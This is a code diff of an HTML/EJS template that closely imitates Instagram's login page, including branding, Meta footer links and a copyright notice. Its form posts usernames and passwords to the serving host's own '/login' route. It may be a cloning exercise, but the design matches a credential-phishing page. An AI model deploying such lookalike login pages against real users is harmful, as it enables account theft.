@@ -1,81 +1,97 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>login</title>
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login • Instagram</title>
+  <link rel="stylesheet" href="/style.css" />
 </head>
 
 <body>
-    <div class="interface">
-        <div class="div1">
-            <div class="leftImage">
-                <img src="landing-2x.png" alt="">
+  <div class="interface">
+    <div class="div1">
+
+      <!-- LEFT IMAGE (HIDDEN ON MOBILE) -->
+      <div class="leftImage">
+        <img src="landing-2x.png" alt="Instagram preview" />
+      </div>
+
+      <!-- RIGHT LOGIN FORM -->
+      <div class="loginBox">
+        <form action="/login" method="post">
+
+          <img src="instagramtext.webp" id="instaText" alt="Instagram" />
+
+          <% if (error) { %>
+            <div class="notice">
+              <p><%= error %></p>
             </div>
-            <div class="loginBox">
-                <form action="/login" method="post">
-                    <img src="instagramtext.webp" id="instaText" alt="">
-                    <div class="input-wrapper">
-                        <input type="text" name="ID" id="username" required />
-                        <label for="username">Phone number, username, or email</label>
-                    </div>
+          <% } %>
 
-                    <div class="password-wrapper">
-                        <input type="password" name="password" id="userPassword" required />
-                        <label for="userPassword">Password</label>
+          <div class="input-wrapper">
+            <input type="text" name="ID" id="username" required />
+            <label for="username">Phone number, username, or email</label>
+          </div>
 
-                        <img src="show.png" id="togglePassword" class="password-icon" alt="Show/Hide Password" />
-                    </div>
+          <div class="password-wrapper">
+            <input type="password" name="password" id="userPassword" required />
+            <label for="userPassword">Password</label>
+            <img src="show.png" id="togglePassword" class="password-icon" />
+          </div>
 
-                    <input type="submit" value="Log in" class="login-btn">
-                    <p id="or">----------------------&nbsp;&nbsp;&nbsp;OR&nbsp;&nbsp;&nbsp;----------------------</p>
-                    <a href="www.facebook.com" id="fb">
-                        <img src="facebook.png" id="facebookicon">
-                        <p id="facebookLogin">Log in with Facebook</p>
-                    </a>
-                    <a href="" id="forgotPassword">
-                        <p id="forgotPassword">Forgot password?</p>
-                    </a>
-                    <p id="signup">Don't have an account? <a href="/signUp">Sign up</a></p>
-                </form>
-            </div>
-        </div>
-        <div class="div2">
-            <ul id="footer">
-                <li><a href="">Meta</li></a>
-                <li><a href="">About</a></li>
-                <li><a href="">Blog</a></li>
-                <li><a href="">Jobs</a></li>
-                <li><a href="">Help</a></li>
-                <li><a href="">API</a></li>
-                <li><a href="">Privacy</a></li>
-                <li><a href="">Terms</a></li>
-                <li><a href="">Locations</a></li>
-                <li><a href="">Instagram lite</a></li>
-                <li><a href="">Threads</a></li>
-                <li><a href="">Contact Uploading & non-users</a></li>
-                <li><a href="">Meta-verified</a></li>
-            </ul>
-            <p id="copyright">English(UK)&nbsp;&nbsp; ©2025 Instagram from Meta</p>
-        </div>
+          <input type="submit" value="Log in" class="login-btn" />
+
+          <p id="or">────────── OR ──────────</p>
+
+          <a href="https://www.facebook.com" id="fb">
+            <img src="facebook.png" id="facebookicon" />
+            <span id="facebookLogin">Log in with Facebook</span>
+          </a>
+
+          <a href="#" id="forgotPassword">Forgot password?</a>
+
+          <p id="signup">
+            Don't have an account? <a href="/signUp">Sign up</a>
+          </p>
+
+        </form>
+      </div>
     </div>
 
-</body>
-<script>
+    <!-- FOOTER -->
+    <div class="div2">
+      <ul id="footer">
+        <li><a href="">Meta</a></li>
+        <li><a href="">About</a></li>
+        <li><a href="">Blog</a></li>
+        <li><a href="">Jobs</a></li>
+        <li><a href="">Help</a></li>
+        <li><a href="">API</a></li>
+        <li><a href="">Privacy</a></li>
+        <li><a href="">Terms</a></li>
+        <li><a href="">Locations</a></li>
+        <li><a href="">Instagram Lite</a></li>
+        <li><a href="">Threads</a></li>
+        <li><a href="">Contact Uploading & Non-Users</a></li>
+        <li><a href="">Meta Verified</a></li>
+      </ul>
+
+      <p id="copyright">
+        English (UK) © 2025 Instagram from Meta
+      </p>
+    </div>
+  </div>
+
+  <script>
     const passwordInput = document.getElementById("userPassword");
     const toggleIcon = document.getElementById("togglePassword");
 
     toggleIcon.addEventListener("click", () => {
-        if (passwordInput.type === "password") {
-            passwordInput.type = "text";
-            toggleIcon.src = "invisible.png"; // hide icon
-        } else {
-            passwordInput.type = "password";
-            toggleIcon.src = "show.png"; // show icon
-        }
+      passwordInput.type =
+        passwordInput.type === "password" ? "text" : "password";
+      toggleIcon.src =
+        passwordInput.type === "password" ? "show.png" : "invisible.png";
     });
-</script>
-
+  </script>
+</body>
 </html>
